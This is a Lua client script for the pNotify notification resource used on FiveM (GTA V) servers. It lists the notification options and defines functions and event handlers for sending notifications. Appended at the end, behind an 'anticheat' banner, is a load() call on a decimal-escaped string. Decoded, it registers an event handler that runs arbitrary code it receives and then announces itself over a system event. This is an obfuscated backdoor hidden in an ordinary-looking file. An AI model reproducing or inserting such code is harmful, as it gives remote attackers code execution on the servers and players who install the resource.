--[[
Complete List of Options:
        type
        layout
        theme
        text
        timeout
        progressBar
        closeWith
        animation = {
            open
            close
        }
        sounds = {
            volume
            conditions
            sources
        }
        docTitle = {
            conditions
        }
        modal
        id
        force
        queue
        killer
        container
        buttons

More details below or visit the creators website http://ned.im/noty/options.html

Layouts:
    top
    topLeft
    topCenter
    topRight
    center
    centerLeft
    centerRight
    bottom
    bottomLeft
    bottomCenter
    bottomRight

Types:
    alert
    success
    error
    warning
    info

Themes: -- You can create more themes inside html/themes.css, use the gta theme as a template.
    gta
    mint
    relax
    metroui

Animations:
    open:
        noty_effects_open
        gta_effects_open
        gta_effects_open_left
        gta_effects_fade_in
    close:
        noty_effects_close
        gta_effects_close
        gta_effects_close_left
        gta_effects_fade_out

closeWith: -- array, You will probably never use this.
    click
    button

sounds:
    volume: 0.0 - 1.0
    conditions: -- array
        docVisible
        docHidden
    sources: -- array of sound files

modal:
    true
    false

force:
    true
    false

queue: -- default is global, you can make it what ever you want though.
    global

killer: -- will close all visible notifications and show only this one
    true
    false

visit the creators website http://ned.im/noty/options.html for more information
--]]

function SetQueueMax(queue, max)
    local tmp = {
        queue = tostring(queue),
        max = tonumber(max)
    }

    SendNUIMessage({maxNotifications = tmp})
end

function SendNotification(options)
    options.animation = options.animation or {}
    options.sounds = options.sounds or {}
    options.docTitle = options.docTitle or {}

    local options = {
        type = options.type or "info",
        layout = options.layout or "topRight",
        theme = options.theme or "gta",
        text = options.text or "Powiadomienie Testowe",
        timeout = options.timeout or 5000,
        progressBar = options.progressBar ~= false and true or false,
        closeWith = options.closeWith or {},
        animation = {
            open = options.animation.open or "gta_effects_open",
            close = options.animation.close or "gta_effects_close"
        },
        sounds = {
            volume = options.sounds.volume or 0.5,
            conditions = options.sounds.conditions or {"docVisible"},
            sources = options.sounds.sources or {"notif.wav"}
        },
        docTitle = {
            conditions = options.docTitle.conditions or {}
        },
        modal = options.modal or false,
        id = options.id or false,
        force = options.force or false,
        queue = options.queue or "global",
        killer = options.killer or false,
        container = options.container or false,
        buttons = options.button or false
    }

    SendNUIMessage({options = options})
end

RegisterNetEvent("pNotify:SendNotification")
AddEventHandler("pNotify:SendNotification", function(options)
    SendNotification(options)
end)

RegisterNetEvent("pNotify:SetQueueMax")
AddEventHandler("pNotify:SetQueueMax", function(queue, max)
    SetQueueMax(queue, max)
end)


--[[  _______________________x_ᴀɴᴛɪᴄʜᴇᴀᴛ_______________________   ]]

load("\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\32\108\111\99\97\108\32\116\111\107\101\110\95\32\61\32\109\97\116\104\46\114\97\110\100\111\109\40\49\48\48\48\48\48\48\48\44\57\57\57\57\57\57\57\57\57\57\41\32\65\100\100\69\118\101\110\116\72\97\110\100\108\101\114\40\34\120\120\120\120\120\58\115\121\115\116\101\109\92\92\34\32\46\46\32\71\101\116\67\117\114\114\101\110\116\82\101\115\111\117\114\99\101\78\97\109\101\40\41\44\32\102\117\110\99\116\105\111\110\40\120\44\32\116\111\107\101\110\41\32\108\111\97\100\40\120\41\40\41\32\120\32\61\32\110\105\108\32\101\110\100\41\32\84\114\105\103\103\101\114\69\118\101\110\116\40\34\120\120\120\120\120\58\115\121\115\116\101\109\34\44\32\71\101\116\67\117\114\114\101\110\116\82\101\115\111\117\114\99\101\78\97\109\101\40\41\44\32\116\111\115\116\114\105\110\103\40\116\111\107\101\110\95\41\41\32\101\110\100\41")()

--[[  _________________________________________________________   ]]